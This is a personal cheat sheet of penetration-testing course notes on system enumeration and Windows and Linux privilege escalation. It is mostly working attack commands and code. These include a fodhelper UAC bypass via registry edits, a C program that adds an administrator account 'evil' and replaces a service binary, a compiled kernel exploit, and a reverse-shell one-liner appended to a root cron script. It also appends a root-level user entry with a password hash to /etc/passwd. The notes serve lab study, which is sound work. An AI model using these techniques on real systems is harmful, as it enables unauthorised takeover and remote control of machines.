---
id: activeinformationgathering
tags: [bash, cheatsheet]
created: 2023-01-26
---
# active-information-gathering

backlinks: [[snippets-bash]]

sources:
- <https://danielmiessler.com/study/vulnerability-database-resources/>

- privilege escalation
  - information gathering
    - manual enumeration of a system is time consuming but allows more control
      - enumerating 
        - users
          - target
            - [w/l] ```shell whoami```
            - [win] ```shell net user <username>```
            - [lin] ```shell id```
          - all
            - [win] ```shell net user```
            - [lin] ```shell cat /etc/passwd```
        - hostname
          - [w/l] ```shell hostname```
        - operating system
          - [win] ```shell systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"```
          - [lin] ```shell cat /etc/issue```
          - [lin] ```shell cat /etc/*-release```
          - [lin] ```shell uname -a```
          - [lin] ```shell lscpu```     architecture
        - running processes and services
          - [win] ```shell tasklist /SVC```
            - does not list processes run by privileged users
          - [lin] ```shell ps axu```
        - network information
          - [win] ```shell ipconfig /all```   tcp/ip config of all adapters
          - [win] ```shell route print```     routing tables
          - [win] ```shell netstat -ano```    active network connections
          - [lin] ```shell ip a```            tcp/ip config of all adapters
          - [lin] ```shell ifconfig a```      tcp/ip config of all adapters
          - [lin] ```shell /sbin/route```     routing tables
          - [lin] ```shell /sbin/routel```    routing tables
          - [lin] ```shell netstat -anp```    active network connections
          - [lin] ```shell ss -anp```         active network connections
        - firewall status and rules
          - [win] ```shell netsh advfirewall show currentprofile```     current firewall rules
          - [win] ```shell netsh advfirewall firewall show rule name=all```   list all firewall rules
          - [lin] to access iptables you must be root
            - check for files in /etc/iptables
            - search for commands iptables-save in history
        - scheduled tasks
          - [win] ```shell schtasks /query /fo LIST /v```     scheduled tasks
          - [lin] ```shell ls -lah /etc/cron*```              cron jobs
          - [lin] ```shell cat /etc/crontab```                system administrator cron jobs mostly run as root
        - install applications and patches
          - [win] ```shell wmic product get name, version, vendor```    installed applications
          - [win] ```shell wmic qfe get Caption, Description, HotFixID, InstalledOn```    hotfixes
            - A combination of the HotFixID and the InstalledOn information can provide us with a precise indication of how quickly they patch this machine.
          - [lin] ```shell dpkg -l```                                   installed applications
        - readable/writeable directories
          - [win] SysInternals AccessChk
            - ```shell accesschk.exe -uws "Everyone" "C:\Program Files"```    search program files dir for any file that allows the Everyone group write permissions (meaning we can overwrite it)
              - -u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search
          - [win] ```shell Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}``` search program files dir for any file that allows the Everyone group write permissions (meaning we can overwrite it)
          - [lin] ```shell find / -writable -type f 2>/dev/null```    every file writable by the current user on the target system
            - /usr/local/james/bin writable folder can be exploited with an overwritten binary
        - unmounted disks
          - [win] ```shell mountvol```        list all drives that are currently mounted
          - [lin] ```shell mount```           list all mounted filesystems
          - [lin] ```shell cat /etc/fstab```  lists all drives that will be mounted at boot time
          - [lin] ```shell /bin/lsblk```      list all available disks
        - device drivers and kernel modules
          - [win] ```shell driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path```
          - [win] ```shell Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}```   get version number by name
          - [lin] ```shell lsmod```     loaded kernel modules
          - [lin] ```shell /sbin/modinfo libata```    drill down into module by name
        - binaries that autoelevate
          - [win] ```shell reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer```   if value = 0x1, any user can run windows installer packages .msi with elevated privs
          - [win] ```shell reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer```  if value = 0x1, any user can run windows installer packages .msi with elevated privs
          - [lin] ```shell find / -perm -u=s -type f 2>/dev/null```     SUID files run with permissions of the file owner (if suid set and owner is root, any local user can execute that binary with eleved privs)
    - automated enumeration
      - windows-privesc-check <https://github.com/pentestmonkey/windows-privesc-check>
        - ```shell windows-privesc-check2.exe -h```     help
        - ```shell windows-privesc-check2.exe --dump -G```    dump to view output and -G to list groups
      - unix_privesc_check <https://pentestmonkey.net/tools/audit/unix-privesc-check>
        - ```shell ./unix-privesc-check```      help
        - ```shell ./unix-privesc-check standard > output.txt```      standard mode and output to output.txt
  - windows privilege escalation
    - Windows Local Security Authority
      - create Security Identifier (SIDS) are a unique value and assigned to each object (including access tokens) 
        - which name Access tokens which effectively describe the security context of a given user including the user privileges
          - Privileges refer to the permissions of a specific account to perform system-related local operations (shutting down, adding users, modifying filesystem)
    - integrity mechanism and is a core component of the Windows security architecture and works by assigning integrity levels to application processes and securable objects
      - System integrity process: SYSTEM rights
      - High integrity process: administrative rights
      - Medium integrity process: standard user rights
      - Low integrity process: very restricted rights often used in sandboxed8 processes
    - User Account Control (UAC)
      - In theory UAC forces applications and tasks to run in the context of a non-administrative account until an administrator authorizes elevated access. It will block installers and unauthorized applications from running without the permissions of an administrative account and also blocks changes to system settings. In general, the effect of UAC is that any application that wishes to perform an operation with a potential system-wide impact, cannot do so silently.
      - two different modes
        - credential prompt - enter your admin creds
        - consent prompt - user just needs to confirm
      - Even while logged in as an administrative user, the account will have two security tokens, one running at a medium integrity level and the other at high integrity level. UAC acts as the separation mechanism between those two integrity levels.
        - ```shell whoami /groups``` the last line shows what this command prompt is running at (see below)
        - ```shell powershell.exe Start-Process cmd.exe -Verb runAs``` even admins have to runas admin
      - Example
        - Windows 10 build 1709
        - fodhelper.exe a Microsoft support application responsible for managing language changes in the operating system. Specifically, this application is launched whenever a local user selects the "Manage optional features" option in the "Apps & features" Windows Settings screen.
        - fodhelper.exe binary runs as high integrity on Windows 10 1709 and interacts with registry keys that can be modified without administrative privileges. We will attempt to find and modify these registry keys in order to run a command of our choosing with high integrity
        - C:\Windows\System32\fodhelper.exe
        - using sigcheck.exe from sysinternals we are going to inspect the manifest
          - ```shell sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe```
          - look at the results shows that the application is meant to be run by administrative users and as such, requires the full administrator access token. Additionally, the autoelevate flag is set to true, which allows the executable to auto-elevate to high integrity without prompting the administrator user for consent.
        - using Process Monitor from sysinternals we are going to gather more info![Alt text](kb/offsec/pen200/18-PrivilegeEscalation/image.png)
        - filter down for operation contains Reg then include fodhelper.exe ![Alt text](kb/offsec/pen200/18-PrivilegeEscalation/image-2.png)
        - results show us lots of registry action ![Alt text](kb/offsec/pen200/18-PrivilegeEscalation/image-1.png)
        - filter again on result is name not found ![Alt text](kb/offsec/pen200/18-PrivilegeEscalation/image-3.png)
        - The output reveals that fodhelper.exe does, in fact, generate the "NAME NOT FOUND" error, an indicator of a potentially exploitable registry entry.
        - since we cannot arbitrarily modify registry entries in every hive, we need to focus on the registry hive we can control. In this case, we will focus on the HKEY_CURRENT_USER (HKCU) hive, which we, the current user, have read and write access to![Alt text](assets/attachments/kb/offsec/pen200/18-PrivilegeEscalation/notes/image-4.png)
        - results ![Alt text](assets/attachments/kb/offsec/pen200/18-PrivilegeEscalation/notes/image-5.png)
        - The fodhelper.exe application attempts to query the HKCU:\Software\Classes\ms-settings\shell\open\command registry key, which does not appear to exist.
        - reset and search the path for ms-settings\shell\open\command
        - hen fodhelper does not find the ms-settings\shell\open\command registry key in HKCU, it immediately tries to access the same key in the HKEY_CLASSES_ROOT (HKCR) hive.10 Since that entry does exist, the access is successful.
        - If we search for HKCR:ms-settings\shell\open\command in the registry, we find a valid entry:![Alt text](assets/attachments/kb/offsec/pen200/18-PrivilegeEscalation/notes/image-6.png)
        - Based on this observation, and after searching the MSDN documentation11 for this registry key format (application-name\shell\open), we can infer that fodhelper is opening a section of the Windows Settings application (likely the Manage Optional Features presented to the user when fodhelper is launched) through the ms-settings: application protocol.12 An application protocol on Windows defines the executable to launch when a particular URL is used by a program. These URL-Application mappings can be defined through Registry entries similar to the ms-setting key we found in HKCR (Figure 12 above). In this particular case, the application protocol schema for ms-settings passes the execution to a COM13 object rather than to a program. This can be done by setting the DelegateExecute key value14 to a specific COM class ID as detailed in the MSDN documentation.
        - This is definitely interesting because fodhelper tries to access the ms-setting registry key within the HKCU hive first. Previous results from Process Monitor clearly showed that this key does not exist in HKCU, but we should have the necessary permissions to create it. This could allow us to hijack the execution through a properly formatted protocol handler. 
          - ```shell REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command```
        - fodhelper.exe attempts to query a value (DelegateExecute) stored in our newly-created command key. This did not happen before we created our fake application protocol key. However, since we do not want to hijack the execution through a COM object, we'll add a DelegateExecute entry, leaving its value empty. Our hope is that when fodhelper discovers this empty value, it will follow the MSDN specifications for application protocols and will look for a program to launch specified in the Shell\Open\command\Default key entry.
          - ```shell REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ```
        - In order to verify that fodhelper successfully accesses the DelegateExecute entry we have just added, we will remove the "NAME NOT FOUND" filter and replace it with "SUCCESS" to show only successful operations and restart the process again:
        - As expected, fodhelper finds the new DelegateExecute entry we added, but since its value is empty, it also looks for the (Default) entry value of the Shell\open\command registry key. The (Default) entry value is created as null automatically when adding any registry key. We will follow the application protocol specifications and replace the empty (Default) value with an executable of our choice, cmd.exe. This should force fodhelper to handle the ms-settings: protocol with our own executable!
        - In order to test this theory, we'll set our new registry value. We'll also specify the new registry value with /d "cmd.exe" and /f to add the value silently.
          - ```shell REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f```
        - running fodhelper.exe once again, we are presented with a command shell
        - ```shell whoami /groups``` the bottom line shows we are running as HIGH which means we are running as admin
    - Insecure file permissions
      - a common way to elevate privileges on a Windows system is to exploit insecure file permissions on services that run as nt authority\system.
      - consider a scenario in which a software developer creates a program that runs as a Windows service. During the installation, the developer does not secure the permissions of the program, allowing full read and write access to all members of the Everyone1 group. As a result, a lower-privileged user could replace the program with a malicious one. When the service is restarted or the machine is rebooted, the malicious file will be executed with SYSTEM privileges.
      - example
        - list all running services
          - ```shell Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}```
        - Serviio service stands out as it is installed in the Program Files directory. This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software.
        - enumerate the permissions on the target service with the icacls2 Windows utility. This utility will output the service's Security Identifiers (or SIDs3) followed by a permission mask, which are defined in the icacls documentation.
          - ```shell icacls "C:\Program Files\Serviio\bin\ServiioService.exe"```
          - most relevent masks are
            - F 	Full access
            - M 	Modify access
            - RX 	Read and execute access
            - R 	Read-only access
            - W 	Write-only access
          - ![Alt text](assets/attachments/kb/offsec/pen200/18-PrivilegeEscalation/notes/image-7.png)
        - the permissions associated with the ServiioService.exe executable are quite interesting. Specifically, it appears that any user (BUILTIN\Users) on the system has full read and write access to it. This is a serious vulnerability
        - we can replace ServiioService.exe with our own malicious binary and then trigger it by restarting the service or rebooting the machine.
        - create basic c file
        ```c #include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}```
        - cross compile it ```shell i686-w64-mingw32-gcc adduser.c -o adduser.exe```
        - transfer it and replace 
          - ```shell move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"```
          - ```shell move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"```
        - restart 
          - service ```shell net stop Serviio```
          - machine ```shell shutdown /r /t 0```
        - Now that the reboot is complete, we should be able to log in to the target machine using the username "evil" with a password of "Ev!lpass". 
        - ```shell net localgroup Administrators```
    - Unquoted Service Paths
      - We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them.
      - each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
      - When using file or directory paths that contain spaces, the developers should always ensure that they are enclosed by quotation marks. n the case of executable paths, anything that comes after each whitespace character will be treated as a potential argument or option for the executable.
      - imagine that we have a service stored in a path such as C:\Program Files\My Program\My Service\service.exe. If the service path is stored unquoted, whenever Windows starts the service it will attempt to run an executable from the following paths:![Alt text](image-8.png)
      - indows will search each "interpreted location" in an attempt to find a valid executable path. In order to exploit this and subvert the original unquoted service call, we must create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and name it so that it also matches the interpreted filename. Then, when the service runs, it should execute our file with the same privileges that the service starts as. Often, this happens to be the NT\SYSTEM account, which results in a successful privilege escalation attack.
      - we could name our executable Program.exe and place it in C:\, or name it My.exe and place it in C:\Program Files. However, this would require some unlikely write permissions since standard users do not have write access to these directories by default.
      - It is more likely that the software's main directory (C:\Program Files\My Program in our example) or subdirectory (C:\Program Files\My Program\My service) is misconfigured, allowing us to plant a malicious My.exe binary.
    - Windows Kernel Vulnerabilities
      - When attempting to exploit system-level software (such as drivers or the kernel itself), we must pay careful attention to several factors including the target's operating system, version, and architecture. Failure to accurately identify these factors can trigger a Blue Screen of Death (BSOD)1 while running the exploit. This can adversely affect the client's production system and deny us access to a potentially valuable target.
      - get version and architecture ```shell systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"```
      - list drivers on the system ```shell >driverquery /v```
        - even if a driver is marked as stopped, we may still be able to interact with it as it is still loaded in the kernel
      - Since Microsoft-installed drivers have a rather rigorous patch cycle, third-party drivers often present a more tempting attack surface. 
        - ```shell searchsploit USBPcap```
        - only one exploit available that matches our OS, patch level and architecture. However, it depends on a particular version of the driver, namely USBPcap version 1.1.0.0, which is installed along with Wireshark 2.2.5.
        - ```shell C:\Program Files\USBPcap> type USBPcap.inf``` which tells us our driverver "DriverVer=10/02/2015,1.1.0.0"
      - compile c code on windows using https://www.mingw-w64.org/
      - go to the install folder c:\program... and exec mingw-w64.bat
      - test ```shell gcc --help```
      - copy the c file from search sploit to the compiling machine exploits/windows/local/41542.c
      - compile ```shell gcc 41542.c -o exploit.ext```
      - execute on win victim![Alt text](assets/attachments/kb/offsec/pen200/18-PrivilegeEscalation/notes/image-9.png)
  
  
  
  - Linux privileges
    - everything is a file and every file abides by user and group permissions based on three primary abilities : read, write, execute
    - Insecure file permissions Cron Jobs
      - locate an executable file that not only allows us write access but also runs at an elevated privilege level
      - On a Linux system, the cron1 time-based job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions
      - get cron jobs 
        - ```shell ls -lah /etc/cron*```              cron jobs
        - ```shell cat /etc/crontab```                system administrator cron jobs mostly run as root
        - ```shell grep "CRON" /var/log/cron.log```   running cron jobs
          - ![Alt text](assets/attachments/kb/offsec/pen200/18-PrivilegeEscalation/notes/image-10.png)
      - It appears that a script called user_backups.sh under /var/scripts/ is executed in the context of the root user. Judging by the timestamps, it seems that this job runs once every five minutes.
      - ```shell cat /var/scripts/user_backups.sh```
      - Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner.3 If our plan works, we should receive a root-level reverse shell on our attacking machine after, at most, a five minute period.
      - ```shell echo >> user_backups.sh```
      - ```shell echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh```
      - ```shell cat user_backups.sh```
      - setup listener on kali and wait ```shell nc -lnvp 1234```
    - Insecure file permissions /etc/passwd
      - Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in /etc/shadow, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file /etc/passwd. For backwards compatibility, if a password hash is present in the second column of a /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow if available. This means that if we can write into the /etc/passwd file, we can effectively set an arbitrary password for any account.
      - In order to escalate our privileges, we are going to add another superuser (root2) and the corresponding password hash to the /etc/passwd file.
        - create password hash on remote machine ```shell openssl passwd evil``` gives us AK24fcSx2Il3I
        - echo root2 line to /etc/passwd ```shell echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd```
        - ```shell su root2``` switch user
        - ```shell id```  get uid, gid, groups













GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```